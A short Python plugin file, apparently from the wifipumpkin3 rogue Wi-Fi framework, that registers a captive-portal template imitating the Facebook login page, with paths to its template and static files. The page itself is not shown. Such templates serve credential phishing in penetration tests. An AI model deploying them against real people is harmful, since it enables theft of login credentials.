# content file: facebook.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C

class Facebook(CaptiveTemplatePlugin):
    Name = "facebook"
    Version = "1.0"
    Description = "Template for facebook page login"
    Author = "Dr.rootsu"
    TemplatePath = C.TEMPLATES_FLASK + "templates/facebook"
    StaticPath = C.TEMPLATES_FLASK + "templates/facebook/static"
    Preview = C.TEMPLATES_FLASK + "templates/facebook/preview.png"